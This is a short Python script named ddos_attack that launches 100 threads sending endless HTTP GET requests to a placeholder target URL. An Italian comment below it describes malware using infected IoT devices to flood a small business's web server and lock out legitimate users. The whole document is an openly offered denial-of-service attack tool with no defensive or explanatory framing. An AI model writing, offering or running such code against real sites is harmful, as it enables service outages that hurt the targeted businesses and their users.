import requests
import threading

def ddos_attack():
    target_url = "http://example.com"
    while True:
        response = requests.get(target_url)

threads = []
for _ in range(100):
    t = threading.Thread(target=ddos_attack)
    threads.append(t)
    t.start()




#Un malware che sfrutta una vasta rete di dispositivi IoT infettati per inviare richieste di servizio a un server di una piccola impresa, causando un'eccessiva congestione del traffico e impedendo agli utenti legittimi di accedere al sito web.